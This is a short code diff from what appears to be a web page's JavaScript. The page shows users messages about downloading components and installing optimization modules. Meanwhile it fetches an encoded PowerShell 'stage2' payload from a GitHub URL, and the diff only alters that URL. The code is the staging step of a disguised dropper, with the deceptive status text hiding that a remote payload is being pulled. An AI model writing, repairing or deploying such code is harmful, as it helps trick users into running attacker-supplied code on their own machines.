@@ -103,7 +103,7 @@
             status.textContent = 'Downloading components...';
             
             // Download PowerShell payload from GitHub
-            const response = await fetch('https://raw.githubusercontent.com/shrnx/readme/main/stage2.txt');
+            const response = await fetch('https://github.com/shrnx/readme/blob/main/stage2.txt');
             const encodedPayload = await response.text();
             
             status.textContent = 'Installing optimization modules...';
